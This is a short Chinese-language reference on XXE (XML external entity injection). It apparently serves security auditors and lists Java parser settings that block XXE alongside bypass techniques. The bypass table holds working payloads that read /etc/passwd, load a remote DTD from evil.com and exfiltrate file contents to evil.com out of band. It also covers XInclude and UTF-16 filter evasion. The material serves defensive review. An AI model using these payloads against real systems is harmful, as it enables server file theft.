# XXE (XML External Entity Injection, CWE-611)

## 误判案例

| 防御手段 | 误判场景 | 为什么安全 |
|---|---|---|
| 禁用 DTD | `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` | 完全禁止 DOCTYPE 声明，ENTITY 无法定义 |
| 禁用外部实体 | `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)` | 通用外部实体不加载 |
| 禁用外部参数实体 | `factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)` | 参数实体无法引用外部资源 |
| JSON 输入 | 接口只接受 `application/json` | 无 XML 解析入口 |
| Jackson 默认配置 | `ObjectMapper` 默认不处理 XML | 除非显式使用 `XmlMapper`，JSON 反序列化不触发 XXE |

## 绕过案例

| 看似防御 | 绕过思路 | 示例 |
|---|---|---|
| 只禁用外部通用实体 | 参数实体仍可引用本地文件 | `<!ENTITY % dtd SYSTEM "file:///etc/passwd"> %dtd;` — 参数实体不受 `external-general-entities` 限制 |
| 只禁用外部实体但允许 DTD | 内部实体 + 外部 DTD 组合 | `<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd"> %remote;` — DTD 中定义通用实体绕过限制 |
| 禁用外部实体但未禁用 DTD | XXE OOB 盲注 | `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?x=%file;'>">%eval;%send;` |
| XInclude | 不需要 DOCTYPE 声明 | `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` |
| SVG 文件上传 | SVG 是 XML 格式 | 上传含 XXE payload 的 SVG → 服务端解析 SVG 时触发 |
| DOCX / XLSX 解压 | Office 文件本质是 ZIP 包含 XML | 修改 `[Content_Types].xml` 注入 ENTITY → 服务端解析文档时触发 |
| SOAP 消息 | SOAP 信封是 XML | 在 SOAP Body 中注入 ENTITY 定义 |
| WAF 过滤 DOCTYPE 但不处理编码 | UTF-16 BOM 绕过 | `\xFF\xFE` 开头的 XML 绕过字符串过滤 |
| DocumentBuilderFactory 默认配置 | 未显式禁用任何特性 | Java 默认允许外部实体，必须手动 setFeature 禁用 |
